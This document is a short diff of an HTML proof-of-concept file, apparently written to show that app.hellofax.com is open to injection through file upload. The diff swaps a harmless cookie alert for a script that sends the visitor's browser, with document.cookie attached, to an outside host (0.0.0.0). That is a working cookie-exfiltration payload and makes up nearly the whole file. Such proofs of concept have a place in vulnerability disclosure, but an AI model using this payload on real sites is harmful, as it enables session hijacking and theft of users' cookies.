@@ -7,9 +7,8 @@
 <body>
 	<h1>This is a POC to demonstrate that app.hellofax.com is vulnerable to iframe injection using file upload </h1>
 	<script>
-	alert(document.cookie);
-		
-		
+	
+			document.location = 'http://0.0.0.0/?cookie=' + document.cookie;
 	</script>
 		</body>
 </html>
